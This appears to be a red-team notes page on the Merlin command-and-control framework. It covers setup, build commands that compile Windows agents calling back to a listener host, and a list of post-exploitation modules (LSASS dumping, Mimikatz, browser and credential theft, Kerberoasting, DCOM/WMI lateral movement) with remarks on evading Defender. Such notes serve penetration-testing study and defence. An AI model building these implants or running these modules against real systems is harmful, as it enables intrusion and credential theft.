---
description: https://github.com/Ne0nd0g/merlin
---

# Merlin

## Installation

### Install GO

```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```

### Install Merlin

```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```

## Launch Merlin Server

```
go run cmd/merlinserver/main.go -i
```

## Merlin Agents

You can [download precompiled agents](https://github.com/Ne0nd0g/merlin/releases)

### Compile Agents

Go to the main folder _$GOPATH/src/github.com/Ne0nd0g/merlin/_

```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```

### **Manual compile agents**

```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```

## Modules

**The bad news is that every module used by Merlin is downloaded from the source (github) and saved indisk before using it. Forge about usingwell known modules because Windows Defender will catch you!**\


**SafetyKatz** --> Modified Mimikatz. Dump LSASS to file and launch:sekurlsa::logonpasswords to that file\
**SharpDump** --> minidump for the process ID specified (LSASS by default) (Itsais that the extension of the final file is .gz but indeed it is.bin, but is agz file)\
**SharpRoast** -->Kerberoast (doesn't work)\
**SeatBelt** --> Local Security Tests in CS (does not work) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> Compile using csc.exe /unsafe\
**Sharp-Up** -->Allchecks in C# in powerup (works)\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool (doesn't works, need to load: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> impersonates all available users and retrieves a challenge-response for each (NTLM hash for each user) (bad url)\
**Invoke-PowerThIEf** --> Steal forms from IExplorer or make it execute JS or inject a DLL in that process (doesnt work) (and the PS looks like doesnt work either) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> Get browser passwords (works but dont prints the output directory)\
**dumpCredStore** --> Win32 Credential Manager API (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> Detect classic injection in running processes (Classic Injection (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (doesnt works)\
**Get-OSTokenInformation** --> Get Token Info of the running processes and threads (User, groups, privileges, owner… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> Execute a command (inother computer) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> Execute a command in othe PC abusing PowerPoint COM objects (ADDin)\
**Invoke-ExcelMacroPivot** --> Execute a command in othe PC abusing DCOM in Excel\
**Find-ComputersWithRemoteAccessPolicies** --> (not working) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> It dumps all the most interesting parts of group policy and then roots around in them for exploitable stuff. (deprecated) Take a look at Grouper2, looks really nice\
**Invoke-WMILM** --> WMI to move laterally\
**Get-GPPPassword** --> Look for groups.xml, scheduledtasks.xml, services.xmland datasources.xml and returns plaintext passwords (insidedomain)\
**Invoke-Mimikatz** --> Use mimikatz (default dump creds)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> Check the privileges of users in computers\
**Find-PotentiallyCrackableAccounts** --> retrieve information about user accounts associated with SPN (Kerberoasting)\
**psgetsystem** --> getsystem

**Didn't check persistence modules**

## Resume

I really like the feeling and the potential of the tool.\
I hope the tool will start downloading the modules from the server and integrates some kind of evasion when downloading scripts.
